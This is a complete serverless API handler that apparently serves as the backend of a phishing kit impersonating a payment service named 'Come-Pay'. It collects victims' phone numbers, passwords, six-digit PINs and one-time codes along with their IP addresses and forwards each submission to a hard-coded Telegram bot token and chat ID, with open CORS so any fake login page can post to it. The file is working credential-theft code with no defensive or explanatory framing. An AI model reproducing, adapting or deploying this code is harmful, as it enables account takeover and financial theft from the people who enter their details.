export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method === 'GET') {
    return res.status(200).json({ status: 'API is working fine!' });
  }

  if (req.method === 'POST') {
    const { phone, pass, pin, type, otp } = req.body || {};

    // ⚠️ YAHAN APNA TELEGRAM BOT TOKEN AUR CHAT ID DAALEIN
    const BOT_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek'; 
    const CHAT_ID = '6076330929';

    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    let message = '';

    if (type === 'login') {
      message = `🔔 Come-Pay - New Login Attempt\n\n📞 Phone: ${phone}\n🔑 Password: ${pass}\n🔐 6-digit PIN: ${pin}\n🌐 IP: ${clientIp}`;
    } 
    else if (type === 'send_otp') {
      message = `📩 Come-Pay - OTP Requested\n\n📞 Phone: ${phone}\n🌐 IP: ${clientIp}`;
    } 
    else if (type === 'verify_otp') {
      message = `🔐 Come-Pay - OTP Entered\n\n📞 Phone: ${phone}\n🔢 OTP: ${otp}\n🌐 IP: ${clientIp}`;
    } else {
      return res.status(400).json({ error: 'Invalid request type' });
    }

    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    return fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        return res.status(200).json({ success: true, message: 'Sent to Telegram' });
      } else {
        return res.status(500).json({ error: 'Failed to send to Telegram' });
      }
    })
    .catch(err => {
      console.error('Telegram Error:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    });
  }

  res.setHeader('Allow', ['GET', 'POST']);
  return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
          }
